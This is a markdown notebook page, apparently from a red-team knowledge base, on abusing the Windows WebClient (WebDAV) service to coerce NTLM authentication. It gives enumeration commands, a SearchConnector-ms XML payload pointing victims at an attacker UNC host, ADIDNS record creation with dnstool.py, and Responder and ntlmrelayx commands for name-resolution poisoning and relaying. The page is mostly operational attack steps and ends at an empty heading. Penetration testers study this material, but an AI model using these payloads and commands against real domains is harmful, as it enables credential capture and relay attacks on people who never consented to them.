---
Primary_category: "[[MITM & COERCED AUTHS]]"
title: "WEB CLIENT ABUSE (WEBDAV)"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[MITM & COERCED AUTHS]]

#### *Enumeration*

##### *Netexec*

> ***[Netexec](https://github.com/Pennyw0rth/NetExec)***

```bash
nxc smb <TARGET[s]> --username '<USER>' --password '<PASSWD>' --module webdav
```

##### *WebClientServiceScanner*

> ***[WebClientServiceScanner](https://github.com/Hackndo/WebclientServiceScanner)***

###### *Setup*

```bash
git clone https://github.com/Hackndo/WebclientServiceScanner WebClientServiceScanner
```

```bash
cd !$ && python3 -m venv .venv
source !$/bin/activate
pip3 install .
```

```bash
webclientservicescanner --help
```

###### *Checking WCS Status*

```bash
webclientservicescanner -dc-ip <DC> '<DOMAIN>/<USER>:<PASSWD>@<TARGET[s]>' # IP or CIDR
```

---

#### *Starting Web Client Service*

##### *SearchConnector-ms*

An operator could drop a *SearchConnector-ms* file into an accessible *share* and wait for incoming connections

```xml
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
    <iconReference>\\ATTACKER@80\test</iconReference>
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <iconReference>\\ATTACKER@80\test</iconReference>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>\\ATTACKER@80\test</url>
    </simpleLocation>
</searchConnectorDescription>
```

When a user accesses that *share*, the *Windows Shell Interface* will try to load the resource specified on the *iconReference* field of the *SearchConnector-ms* file

> [!IMPORTANT]- *Important*
>
> Be aware that, when trying to connect to an *HTTP Server*, the address on the *UNC* specified must not contain any dots i.e. it cannot be an IP Address
>
> Therefore, it is always necessary to specify a hostname
>
> As an operator usually performs any action from its own machine, which is neither a *Windows host* nor *domain-joined*, it could be difficult to be recognized by *domain-joined hosts*
>
> Therefore, an authenticated attacker could use the *ADIDNS (Active Directory Integrated DNS)* to create a *DNS record* on the *Domain's DNS Zone* which points to the attacker IP Address
>
> ```bash
> dnstool.py -dc-ip <DC> --user '<DOMAIN>\<USER>' --password '<PASSWD>' --tcp --record 'ATTACKER' --action add --data '<ATTACKER_IP>' '<DC>'
> ```
>
> After, the above record value can be queried as follows →
>
> ```bash
> dnstool.py -dc-ip <DC> --user '<DOMAIN>\<USER>' --password '<PASSWD>' --tcp --record 'ATTACKER' --action query '<DC>'
> ```
>
> From there, any *DNS* query performed  by any *domain-joined host* for that *name* to the *DC* will resolve to the *Attacker  IP Address*. Thus, that *name* can be used as the target in the following *UNC*
>
> ```bash
> \\ATTACKER@80\test
> ```
>
> An alternative would be to leverage the *Multicast Name Resolution Protocols* such as *LLMNR, NBT-NS or mDNS*
>
> When a *Windows host* needs to resolve a name into a valid IP Address, it queries these resources in the following order →
>
> - ***Hosts File - `C:\Windows\System32\drivers\etc\hosts`***
> - ***DNS Local Cache***
> - ***DNS Resolvers - {Primary,Secondary} DNS Servers***
> - ***Multicast Name Resolution Protocols - LLMNR, NBT-NS, MDNS***
>
> If a *Windows Host* queries a *non-existent name* on the *Domain's DNS Zone* to the *Primary DNS Server*, usually the *DC*, it will respond back with a *"No such name response"* and the *multicast resolution protocols* will act as a fallback
>
> ![[WEB CLIENT ABUSE (WEBDAV)-20250916175236661.webp|350]]
>
> As these protocols are *multicast-based*, the *Windows victim* will send subsequent *name resolution queries* to all hosts in the *multicast range*
>
> Therefore, the attacker will also receive the query and respond back to it
>
> ![[WEB CLIENT ABUSE (WEBDAV)-20250916175413471.webp|350]]
>
> The above poisoning task can be accomplished using ***[Responder](https://github.com/lgandx/Responder)***
>
> ```bash
> python3 Responder.py --interface <INTERFACE>
> ```
>
> Tha attacker must have configured an *HTTP Server*
>
> At this point, the *Web Client Service* should be running
>

Then, the operator receives a connection to his *HTTP Server* and the *Web Client Service* should be running

Note that the configured *HTTP Server* on the *attacker side* must support *WebDAV* method in order to trigger the *WebClientService*

An adversary could use ***[Responder](https://github.com/lgandx/Responder)*** or ***[NTLMRelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)*** for this task

###### *Responder*

> ***HTTP Server must be enabled on Responder.conf file***

```bash
python3 Responder.py --interface ens33
```

###### *NTLMRelayx.py*

```bash
ntlmrelayx.py --no-smb-server --no-wcf-server
```

Then, check if the *Web Client Service* is running on the target

```bash
nxc smb <TARGET> --username '<USER>' --password '<PASSWD>' --module webdav
```

##### *WebDAV Server Mapping*

